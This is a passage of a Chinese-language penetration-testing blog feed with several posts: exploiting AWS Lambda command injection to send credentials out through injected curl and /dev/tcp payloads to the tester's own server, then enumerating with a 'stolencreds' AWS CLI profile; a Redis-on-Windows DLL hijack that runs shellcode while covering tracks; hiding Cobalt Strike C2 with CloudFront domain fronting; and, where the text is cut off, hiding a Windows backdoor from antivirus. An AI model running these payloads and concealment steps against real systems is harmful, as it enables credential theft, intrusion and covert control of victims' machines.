        <content type="html"><![CDATA[<h3 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h3><p>测试的时候发现AWS的Lambda里面有这样的代码，可以很明显的看出来存在命令注入：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">execute_command <span class="token operator">=</span> <span class="token string">"ffmpeg -i "</span> <span class="token operator">+</span> video_url <span class="token operator">+</span> <span class="token string">" -y -f "</span> <span class="token operator">+</span> img_format <span class="token operator">+</span> <span class="token string">" -ss "</span> <span class="token operator">+</span> time_index <span class="token operator">+</span> <span class="token string">" -vframes 1 "</span> <span class="token operator">+</span> WH <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> output_path<span class="token keyword">print</span><span class="token punctuation">(</span>execute_command<span class="token punctuation">)</span>cp <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>execute_command<span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span> stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>攻击的Payload： <code>;curl &lt;your vps&gt;:&lt;port&gt;;</code>，然后在自己服务器监听可以收到Lambda容器发起的请求。</p><h5 id="修复代码"><a href="#修复代码" class="headerlink" title="修复代码:"></a>修复代码:</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python">cp <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"ffmpeg"</span><span class="token punctuation">,</span> <span class="token string">"-i"</span><span class="token punctuation">,</span> video_url<span class="token punctuation">,</span> <span class="token string">"-y"</span><span class="token punctuation">,</span> <span class="token string">"-f"</span><span class="token punctuation">,</span> img_format<span class="token punctuation">,</span> <span class="token string">"-ss"</span><span class="token punctuation">,</span> time_index<span class="token punctuation">,</span> <span class="token string">"-vframes"</span><span class="token punctuation">,</span> <span class="token string">"1"</span><span class="token punctuation">,</span> output_path<span class="token punctuation">]</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span> stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="储备知识"><a href="#储备知识" class="headerlink" title="储备知识"></a>储备知识</h3><ul><li>Lambda函数代码路径: <code>/var/task</code></li><li>用户凭证: 存储在环境变量里面，<code>AWS_ACCESS_KEY_ID</code>, <code>AWS_SECRET_ACCESS_KEY</code>, <code>AWS_SESSION_TOKEN</code></li><li>文件系统: <code>/var/task</code>只读，<code>/tmp</code>可写</li><li>默认用户: <code>sbx_userxxx</code></li><li>Lambda计算的最大超时时间是15分钟，凭证过期时间是11个小时左右</li><li>攻击Lambda只需要获取AK、SK、Token，反弹shell没什么意义</li></ul><p>在存在命令执行的情况下先获取用户凭证，然后使用<code>awscli</code>写入本地配置文件里面，通过<code>awscli</code>来操作，如果在创建<code>Lambda</code>的权限控制不足，这个时候就可以使用<code>awscli</code>来操作各种资源，比如我发现的命令执行有对主账户下所有网卡的操作权限，可以使用获取到的用户凭证删除所有网卡接口。</p><p>存在另外一种情况，当获取到的凭证权限很小的时候，到处都是<code>is not authorized to perform</code>，可以通过以下查询来查看自己的凭证都什么权限，首先配置命令行工具：</p><h6 id="配置aws命令行工具"><a href="#配置aws命令行工具" class="headerlink" title="配置aws命令行工具"></a>配置aws命令行工具</h6><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">aws configure --profile stolencreds输入获取到的AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY和对应区域，编辑~/.aws/credentials，在配置文件里面增加aws_session_token，设置获取到的对应值<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2021/04/01/aws-lambda-rce/aws2.png"></p><h6 id="获取function-name、role-name"><a href="#获取function-name、role-name" class="headerlink" title="获取function name、role name"></a>获取function name、role name</h6><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">aws sts get-caller-identity --profile stolencreds  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ARN(Amazon Resource Name)是AWS里面唯一资源标示符号，ARN的格式取决于特定的资源，一般是这种格式：</p><pre class="line-numbers language-none"><code class="language-none">arn:partition:service:region:account-id:resource-idarn:partition:service:region:account-id:resource-type&#x2F;resource-idarn:partition:service:region:account-id:resource-type:resource-id<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li><code>partition</code>：资源所在分区<ul><li><code>aws</code> - AWS 区域</li><li><code>aws-cn</code> - 中国区域</li><li><code>aws-us-gov</code> - AWS GovCloud (US) 区域</li></ul></li><li><code>service</code>: 标识 AWS 产品的服务命名空间。例如，s3 表示 Amazon S3 资源。</li><li><code>region</code>: 区域。例如，us-east-2 表示 美国东部（俄亥俄州）。</li><li><code>account-id</code>: 拥有资源的 AWS 账户的 ID（不含连字符）。例如，123456789012。</li><li><code>resource-id</code>: 资源标识符。ARN 的这一部分可以是资源的名称或 ID，也可以是资源路径. 例如，<code>user/Bob</code>表示 IAM 用户.</li></ul><p>在Lambda里面，ARN的格式是如下这样的表示：<code>arn:aws:sts::&#123;AccountID&#125;:assumed-role/&#123;RoleName&#125;/&#123;FunctionName&#125;</code></p><p><img src="/2021/04/01/aws-lambda-rce/aws.png"></p><h6 id="获取函数的权限明细"><a href="#获取函数的权限明细" class="headerlink" title="获取函数的权限明细"></a>获取函数的权限明细</h6><pre class="line-numbers language-none"><code class="language-none">aws lambda get-policy --function-name &lt;function name&gt;  --output text <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h6 id="获取attach的权限明细"><a href="#获取attach的权限明细" class="headerlink" title="获取attach的权限明细"></a>获取attach的权限明细</h6><pre class="line-numbers language-none"><code class="language-none">aws iam list-attached-role-policies --role-name &lt;role name&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h6 id="获取policy-name"><a href="#获取policy-name" class="headerlink" title="获取policy name"></a>获取policy name</h6><pre class="line-numbers language-none"><code class="language-none">aws iam list-role-policies --role-name &lt;role name&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h6 id="获取用户凭证的权限明细"><a href="#获取用户凭证的权限明细" class="headerlink" title="获取用户凭证的权限明细"></a>获取用户凭证的权限明细</h6><pre class="line-numbers language-none"><code class="language-none">aws iam get-role-policy --role-name &lt;role name&gt; --policy-name &lt;policy name&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>通过查询用户凭证的权限明细，就可以根据获取到的凭证操作AWS的资源，比如S3、EC2。这里的用户凭证权限明细不包括attach的权限</p><h6 id="常用的查询"><a href="#常用的查询" class="headerlink" title="常用的查询"></a>常用的查询</h6><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">aws lambda list-functions --profile stolencredsaws ssm describe-instance-information --profile stolencredsaws s3 <span class="token function">ls</span> --profile stolencredsaws lambda get-function --function-name FatVideoFrameFFmpeg --query <span class="token string">'Code.Location'</span> --profile stolencreds<span class="token function">wget</span> -O lambda-function.zip url-from-previous-query --profile stolencredsaws ec2 describe-network-interfaces<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="疑难问题"><a href="#疑难问题" class="headerlink" title="疑难问题"></a>疑难问题</h3><ol><li><p>当确定存在命令执行的时候，先使用了<code>wget</code>，查看<code>cloudwatch</code>之后发现不存在这个命令，当我使用<a href="https://github.com/pumasecurity/serverless-prey">serverleess-prey</a>测试的时候发现<code>curl</code>都不存在。这时候可以使用<code>;cat /tmp/env.txt &gt; /dev/tcp/&lt;vps&gt;/&lt;port&gt;;</code>来传输数据，先把需要获取到的内容写入到文件，然后外带传输。</p></li><li><p>另外一个隐患是DoW（Denial of Wallet），因为Lambda是按照函数调用次数付费的，所以如果找到一个Lambda的事件触发器，一般是一个http请求，发起大量请求消耗资源, 延伸一下腾讯在推的类似一个业务在github上有很多开源项目 :( 。AWS可以再加一层<code>cloudfront</code>，然后配合<code>cloudwatch</code>或者账单预警来完善，或者添加用户认证token。</p></li><li><p>为什么上面我没有提命令执行之后反弹shell呢？因为一反弹成功之后马上断开。最后在Lambda的配置里面发现Lambda执行的timeout是3s，lambda在建立的时候默认运行时间是3s，可以修改为最大15分钟。</p></li><li><p>还有一种攻击手法，可以修改代码运行环境，没看太懂: <a href="https://unit42.paloaltonetworks.com/gaining-persistency-vulnerable-lambdas/">Gaining Persistency on Vulnerable Lambdas</a></p></li></ol><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://mp.weixin.qq.com/s/duF1Z0EDC3n_G378Aq_XYA">针对AWS Lambda的运行时攻击</a></li><li><a href="https://mp.weixin.qq.com/s?__biz=MzIyODYzNTU2OA==&mid=2247488798&idx=1&sn=485e2131f347ff4d8c3b5b3286b36c97&scene=21#wechat_redirect">Serverless安全研究 — Serverless安全风险</a></li><li><a href="https://unit42.paloaltonetworks.com/gaining-persistency-vulnerable-lambdas/">Gaining Persistency on Vulnerable Lambdas</a></li><li><a href="https://blog.appsecco.com/getting-shell-and-data-access-in-aws-by-chaining-vulnerabilities-7630fa57c7ed">Getting shell and data access in AWS by chaining vulnerabilities</a></li><li><a href="https://docs.aws.amazon.com/zh_cn/general/latest/gr/aws-arns-and-namespaces.html">aws-arns-and-namespaces</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Pentest </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CobaltStrike的Stager特征隐藏</title>
      <link href="/2021/01/04/CloudFront-find-cobaltstrike.html"/>
      <url>/2021/01/04/CloudFront-find-cobaltstrike.html</url>
      
        <content type="html"><![CDATA[<h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>在github上面出现一个仓库分析<code>CobaltStrike</code>监听端口的特征：<a href="https://github.com/Te-k/cobaltstrike">https://github.com/Te-k/cobaltstrike</a>。CS在监听Stager端口的时候，会通过URI下载Payload执行，这个URI生成的规则生成：</p><p><img src="/2021/01/04/CloudFront-find-cobaltstrike/360.png"></p><h3 id="找到DomainFront"><a href="#找到DomainFront" class="headerlink" title="找到DomainFront"></a>找到DomainFront</h3><p>根据360的空间测绘，看完之后第一时间想到的是通过fofa这类空间测绘找出特征，然后找出来设置了DomainFront的C2，想看看这些C2<br>的原始域名和设置C2的域名是什么情况，大家都用的什么作为域名前置的 :)</p><h4 id="Quake测绘"><a href="#Quake测绘" class="headerlink" title="Quake测绘"></a>Quake测绘</h4><p>根据360给出的搜索条件，先找出来一批IP地址:</p><pre class="line-numbers language-none"><code class="language-none">response:&quot;HTTP&#x2F;1.1 404 Not Found&quot; AND response:&quot;Content-Type: text&#x2F;plain&quot; AND response:&quot;Content-Length: 0&quot; AND NOT response:&quot;Server: &quot; AND NOT response:&quot;Connection: &quot; AND port: &quot;443&quot;   AND NOT country: &quot;China&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="修改脚本"><a href="#修改脚本" class="headerlink" title="修改脚本"></a>修改脚本</h4><p>修改好之后的脚本和扫描结果:<a href="https://github.com/JKme/cobaltstrike">https://github.com/JKme/cobaltstrike</a>。把单线程改为多线程，再增加一个获取IP的https证书域名函数：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">get_subject</span><span class="token punctuation">(</span>hostname<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        dst <span class="token operator">=</span> <span class="token punctuation">(</span>hostname<span class="token punctuation">,</span> <span class="token number">443</span><span class="token punctuation">)</span>        s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>        s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>dst<span class="token punctuation">)</span>        ctx <span class="token operator">=</span> ssl<span class="token punctuation">.</span>create_default_context<span class="token punctuation">(</span><span class="token punctuation">)</span>        ctx<span class="token punctuation">.</span>check_hostname <span class="token operator">=</span> <span class="token boolean">False</span>        ctx<span class="token punctuation">.</span>verify_mode <span class="token operator">=</span> ssl<span class="token punctuation">.</span>CERT_NONE        s <span class="token operator">=</span> ctx<span class="token punctuation">.</span>wrap_socket<span class="token punctuation">(</span>s<span class="token punctuation">,</span> server_hostname<span class="token operator">=</span>dst<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        cert_bin <span class="token operator">=</span> s<span class="token punctuation">.</span>getpeercert<span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span>        x509 <span class="token operator">=</span> crypto<span class="token punctuation">.</span>load_certificate<span class="token punctuation">(</span>crypto<span class="token punctuation">.</span>FILETYPE_ASN1<span class="token punctuation">,</span> cert_bin<span class="token punctuation">)</span>        val <span class="token operator">=</span> x509<span class="token punctuation">.</span>get_subject<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>CN    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        val <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>    <span class="token keyword">return</span> val<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="扫描结果"><a href="#扫描结果" class="headerlink" title="扫描结果"></a>扫描结果</h3><ul><li>最多使用的<code>GET URI</code>是<code>submit.php</code></li><li>除了aws的<code>CloudFront</code>作为最多的域前置，还有使用<code>API Gateway</code>，猜测使用了https流量转发或者直接接入到网关。</li><li>还有使用了巨硬家的域名，那这种就是<code>Domain takeover</code>来获取到的</li></ul><h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><p>如果是使用了AWS家的<code>CloudFront</code>作为域前置，可以设置防火墙规则，只允许属于<code>CloudFront</code>的域名流量，其他IP请求过来的流量丢掉，操作如下:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">0x01:  获取到CloudFront的所有IPhttp http://d7uri8nf7uskq.cloudfront.net/tools/list-cloudfront-ips <span class="token operator">|</span>jq <span class="token string">".[][]"</span> <span class="token operator">|</span> <span class="token function">sed</span> <span class="token string">'s/"//g'</span> <span class="token operator">|</span> <span class="token function">tee</span> /tmp/cloud.txt0x02: 使用ipset新增IP集合ipset create cloudfront hash:net<span class="token keyword">while</span> <span class="token builtin class-name">read</span> line<span class="token punctuation">;</span> <span class="token keyword">do</span> ipset <span class="token function">add</span> cloudfront <span class="token variable">$line</span><span class="token punctuation">;</span> <span class="token keyword">done</span> <span class="token operator">&lt;</span> /tmp/cloud.txtipset list cloudfront0x03: 新增IPtables规则iptables -A INPUT -p tcp  --dport <span class="token number">443</span> -j DROPiptables -I INPUT -m <span class="token builtin class-name">set</span> --match-set cloudfront  src -p tcp  --dport <span class="token number">443</span> -j ACCEPT0x04: 同理对teamserver端口进行规则设置ipset create teamserver hash:ipipset <span class="token function">add</span> teamserver <span class="token number">1.2</span>.3.4iptables -A INPUT -p tcp  --dport <span class="token number">50050</span> -j DROPiptables -I INPUT -m <span class="token builtin class-name">set</span> --match-set teamserver src -p tcp --dport <span class="token number">50050</span> -j ACCEPT上面两个iptables规则可以合并一条：iptables -I INPUT -m <span class="token builtin class-name">set</span> <span class="token operator">!</span> --match-set teamserver src -p tcp --dport <span class="token number">50050</span> -j DROP0x05: ipset常见命令ipset del teamserver <span class="token number">1.2</span>.3.4  <span class="token comment">#从teamserver中删除某IP</span>ipset list teamserver <span class="token comment"># 查看teamserver集合内容</span>ipset flush teamserver <span class="token comment"># 清空teamserver内容</span>ipset flush  <span class="token comment"># 清空所有</span>ipset destroy teamserver  <span class="token comment"># 销毁teamserver</span>ipset destroy <span class="token comment"># 销毁所有</span>0x06: iptables删除规则<span class="token comment"># 显示规则</span>iptables -L INPUT --line-numbers <span class="token comment"># 删除规则</span>iptables -D INPUT <span class="token operator">&lt;</span>num<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当然，也可以直接修改CS的源代码重新打包。</p><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>IPSET设置白名单之后，会对CS的设置VPN功能有影响。</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://mp.weixin.qq.com/s/BLM8tM88x9oT4CjSiupE2A">浅析CobaltStrike Beacon Staging Server扫描</a></li><li><a href="https://www.cnblogs.com/donot/p/14226788.html">针对CobaltStrike中出现的Stager监听端口特征后门分析</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Pentest </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Redis On Windows -- Dll Hijack</title>
      <link href="/2020/09/10/redis-windows-hijack.html"/>
      <url>/2020/09/10/redis-windows-hijack.html</url>
      
        <content type="html"><![CDATA[<p>本文测试了Redis在Windows平台下的dll劫持，主要参考文章是先知的秋水师傅: <a href="https://xz.aliyun.com/t/8153">Redis on Windows 出网利用探索</a></p><h3 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h3><pre class="line-numbers language-none"><code class="language-none">Redis-x64-3.2.100Win10<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="可劫持的DLL"><a href="#可劫持的DLL" class="headerlink" title="可劫持的DLL"></a>可劫持的DLL</h3><p>按照文章中使用<code>Process Monitor</code>，在使用<code>redis-cli</code>操作的时候，观察缺失的DLL。在<code>Process Monitor Filter</code>里面设置<code>Image Path</code>的值为<code>redis-server.exe</code>的路径，比如我的是<code>C:\Program Files\Redis\redis-server.exe</code>，<code>Path</code>设置为<code>ends with dll</code>。设置好之后，使用<code>redis-cli</code>连接，执行<code>bgsave</code>命令，然后观察缺失的dll，有如下:</p><pre class="line-numbers language-none"><code class="language-none">HKLM\System\CurrentControlSet\Control\Srp\GP\DLLC:\Program Files\Redis\dbghelp.dllC:\Windows\System32\edgegdi.dllC:\Windows\System32\symsrv.dll<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>当<code>redis-server.exe</code>启动的时候，有如下:</p><pre class="line-numbers language-none"><code class="language-none">C:\Windows\System32\edgegdi.dllC:\Windows\System32\symsrv.dllC:\Program Files\Redis\CRYPTBASE.DLL<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>执行<code>BGREWRITEAOF</code>的时候，有如下:</p><pre class="line-numbers language-none"><code class="language-none">HKLM\System\CurrentControlSet\Control\Srp\GP\DLLC:\Program Files\Redis\dbghelp.dllC:\Windows\System32\edgegdi.dllC:\Windows\System32\symsrv.dll<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>最终在Redis目录下可以利用的有两个:<code>cryptbase.dll</code>和<code>dbghelp.dll</code>。如果是权限持久性控制，两个都可以，这里我们选择主动攻击，所以使用<code>dbghelp.dll</code>。</p><p>###DLLHijacker</p><p>使用kiwings师傅的<a href="https://github.com/kiwings/DLLHijacker">DLLHijacker</a>，因为在系统里面是存在<code>C:\Windows\System32\dbghelp.dll</code>的，所以，复制出来之后，运行脚本，生成DLL工程项目。修改里面的shellcode和dbghelp.dll的绝对路径。</p><p>在实际测试的时候，运行脚本报错，所以修改了一部分代码: <a href="https://github.com/JKme/sb_kiddie-/tree/master/dll_hijack">https://github.com/JKme/sb_kiddie-/tree/master/dll_hijack</a></p><p>把生成的dll重命名为<code>dghelp.dll</code>放在redis的安装目录，然后执行<code>bgsave</code>或者<code>redis-server</code>启动的时候会执行shellcode。</p><p><img src="/2020/09/10/redis-windows-hijack/WX20200910.png"></p><h3 id="测试结果"><a href="#测试结果" class="headerlink" title="测试结果"></a>测试结果</h3><p>在实际的渗透测试中，使用<a href="https://github.com/r35tart/RedisWriteFile">RedisWriteFile</a>写入文件的时候，因为使用的是主从复制，会把redis里面的数据清空，这样攻击之后可能会被发现，所以可以这样做:</p><h5 id="备份redis"><a href="#备份redis" class="headerlink" title="备份redis"></a>备份redis</h5><ul><li><a href="https://github.com/yannh/redis-dump-go">redis-dump-go</a></li></ul><pre class="line-numbers language-none"><code class="language-none">备份:.&#x2F;redis-dump-go -host 192.168.2.233 -output commands &gt; redis.dump恢复:redis-cli -h 192.168.2.233 &lt; redis.dump<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="攻击步骤"><a href="#攻击步骤" class="headerlink" title="攻击步骤"></a>攻击步骤</h3><ol><li>准备好dll，使用<a href="https://github.com/r35tart/RedisWriteFile">RedisWriteFile</a>写入</li><li>备份Redis: <code>./redis-dump-go -host 192.168.2.233 -output commands &gt; redis.dump</code></li><li>执行<code>bgsave</code>,获取Shell</li><li>恢复Redis: <code>redis-cli -h 192.168.2.233 &lt; redis.dump</code></li></ol>]]></content>
      
      
      <categories>
          
          <category> Pentest </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Domain Fronting隐藏HTTPS</title>
      <link href="/2020/08/28/CloudFront-Https.html"/>
      <url>/2020/08/28/CloudFront-Https.html</url>
      
        <content type="html"><![CDATA[<p>记录一下当使用<code>Domain Fronting</code>中使用<code>https</code>来上线时候的坑，因为查了半圈没有找到类似的资料，为啥非要https呢，因为<code>node32</code>对http的流量很敏感。</p><p>###目标</p><ol><li>使用<code>Windows/beacon_https/reverse_https</code>作为上线的payload</li><li>AWS的<code>Cloudfront</code>作为前置域名</li></ol><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><pre class="line-numbers language-none"><code class="language-none">域名: example.comVPS(Centos)cloudflare(只作域名解析,不添加任何其他功能，不加CDN，不加HTTPS)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="部署工作"><a href="#部署工作" class="headerlink" title="部署工作"></a>部署工作</h2><p>安装的apache是测试连通性，除此之外没有任何用处。</p><pre class="line-numbers language-none"><code class="language-none">yum install httpdsystemctl start httpd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="增加apache配置文件"><a href="#增加apache配置文件" class="headerlink" title="增加apache配置文件"></a>增加apache配置文件</h4><pre class="line-numbers language-none"><code class="language-none">#&#x2F;etc&#x2F;httpd&#x2F;conf.d&#x2F;vhost.conf&lt;VirtualHost *:80&gt;   DocumentRoot &#x2F;var&#x2F;www&#x2F;html   ServerName example.comRewriteEngine onRewriteCond %&#123;SERVER_NAME&#125; &#x3D;example.comRewriteRule ^ https:&#x2F;&#x2F;%&#123;SERVER_NAME&#125;%&#123;REQUEST_URI&#125; [END,NE,R&#x3D;permanent]&lt;&#x2F;VirtualHost&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="设置https"><a href="#设置https" class="headerlink" title="设置https"></a>设置https</h4><p>运行脚本<code>HTTPsC2DoneRight.sh</code>生成对应需要的文件，比如<code>letsencrypt</code>、<code>amazon.profile</code>等文件，这个时候https会自动设置成功，测试如下:</p><pre class="line-numbers language-none"><code class="language-none">curl http:&#x2F;&#x2F;example.comcurl https:&#x2F;&#x2F;example.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这时候会生成https通信需要的证书文件，一般是通过自签名Letsencrypt申请下来的：</p><pre class="line-numbers language-none"><code class="language-none">.&#x2F;letsencrypt-auto certonly --standalone -d 域名 --email 邮箱（可匿名）openssl pkcs12 -export -in fullchain.pem -inkey privkey.pem -out pkcs.p12 -name 域名 -passout pass:ABcd123456keytool -importkeystore -deststorepass ABcd123456 -destkeypass ABcd123456 -destkeystore keystore.store -srckeystore pkcs.p12 -srcstoretype PKCS12 -srcstorepass ABcd123456 -alias 域名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>生成的keystore是后面设置CS配置文件的时候使用。</p><h4 id="设置CloudFront"><a href="#设置CloudFront" class="headerlink" title="设置CloudFront"></a>设置CloudFront</h4><p>标红的点特别注意，要改成这个样子，否则测试失败。更改之后发布，测试此时的<code>CloudFront</code>是否生效:</p><pre class="line-numbers language-none"><code class="language-none">curl https:&#x2F;&#x2F;&lt;example&gt;.cloudfront.netcurl http:&#x2F;&#x2F;&lt;example&gt;.cloudfront.net<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2020/08/28/CloudFront-Https/WX20221129.png"></p><h4 id="设置Profile"><a href="#设置Profile" class="headerlink" title="设置Profile"></a>设置Profile</h4><p>生成Profile，上面生成的<code>amazon.profile</code>测试上线失败。</p><pre class="line-numbers language-none"><code class="language-none">cd &amp;&amp; git clone https:&#x2F;&#x2F;github.com&#x2F;bluscreenofjeff&#x2F;Malleable-C2-Randomizer &amp;&amp; cd Malleable-C2-Randomizerpython malleable-c2-randomizer.py -profile Sample\ Templates&#x2F;Pandora.profile -notestcp pandora_&lt;random&gt;.profile &#x2F;root&#x2F;cobaltstrike&#x2F;httpsProfile&#x2F; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="修改profile"><a href="#修改profile" class="headerlink" title="修改profile"></a>修改profile</h4><ol><li>把amazon.profile的最后四行设置https的添加到pandora_<random>.profile里面。</random></li><li>修改<code>pandora_&lt;random.profile</code>里面的<code>Host</code>，改为aws申请下来的加速域名。</li><li>在profile文件最后新增配置：</li></ol><pre class="line-numbers language-none"><code class="language-none">https-certificate &#123;set keystore &quot;keystore.store&quot;;set password &quot;1234565&quot;;&#125;http-config &#123;set trust_x_forwarded_for &quot;true&quot;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="设置CS"><a href="#设置CS" class="headerlink" title="设置CS"></a>设置CS</h4><pre class="line-numbers language-none"><code class="language-none">systemctl stop httpd  &#x2F;&#x2F;关闭apache.&#x2F;teamserver &lt;IP&gt; &lt;Pass&gt; &lt;path to pandora profile&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>新建一个listener:</p><p><img src="/2020/08/28/CloudFront-Https/WX20200828-02.png"></p><p>查看CS的<code>WEBlog</code>:</p><pre class="line-numbers language-none"><code class="language-none">curl https:&#x2F;&#x2F;cloudfront.net&#x2F;Hello<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在weblog里面查看到对应的请求即设置成功。</p><p><img src="/2020/08/28/CloudFront-Https/WX20200828-03.png"></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://www.blackhillsinfosec.com/using-cloudfront-to-relay-cobalt-strike-traffic/">https://www.blackhillsinfosec.com/using-cloudfront-to-relay-cobalt-strike-traffic/</a></li><li><a href="https://www.cnblogs.com/donot/p/13921874.html">Domain Fronted仍然是最佳的C2隐藏手段</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Pentest </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Windows后门隐藏</title>
      <link href="/2020/08/28/hide-your-windows-backdoor.html"/>
      <url>/2020/08/28/hide-your-windows-backdoor.html</url>
      
        <content type="html"><![CDATA[<h3 id="后门的构成"><a href="#后门的构成" class="headerlink" title="后门的构成"></a>后门的构成</h3><p>分为三个部分:</p><ol><li>shellcode的分离免杀</li><li>C2服务器的隐藏</li><li>Windows后门的设置</li></ol><h3 id="分离免杀"><a href="#分离免杀" class="headerlink" title="分离免杀"></a>分离免杀</h3><p>shellcode的分离免杀有很多种，这里把每个模块拿出来就是如下的几个:</p><ol><li>通信: <code>socket</code>,<code>http</code></li><li><code>shellcode</code>的执行方式</li><li><code>shellcode</code>的流量</li><li>远程服务器的隐藏</li></ol><p>除去第二种方式有很多种可以执行shellcode的，其他三种最好的解决方案是实用<code>Domain Fronting</code>隐藏服务器，AES动态加密解密运行shellcode。这样子既隐藏了服务器，又避免shellcode的明文流量被探测到。当然上线之后的操作被探测不在被讨论的范围之内。</p><p>在参考资料里面,<code>uknownsec</code>已经把主要的代码放出来了。只需要拿出来拼凑一下就可以食用。</p><p>其中服务端出去python的功能之外，可以给自己加上一个<code>slack</code>机器人的通知，这样子上线的时候就有通知。</p><h4 id="C2服务器的隐藏"><a href="#C2服务器的隐藏" class="headerlink" title="C2服务器的隐藏"></a>C2服务器的隐藏</h4><p>见上一篇的<code>Domain Fronting</code>隐藏HTTPS。</p><p>这个C2的隐藏如果更完美一点的话，可以加上redirector。但是我想了一下，开启CS的时间就是控制利用的那一小段，这里就不折腾了。</p><h4 id="Windows后门的设置"><a href="#Windows后门的设置" class="headerlink" 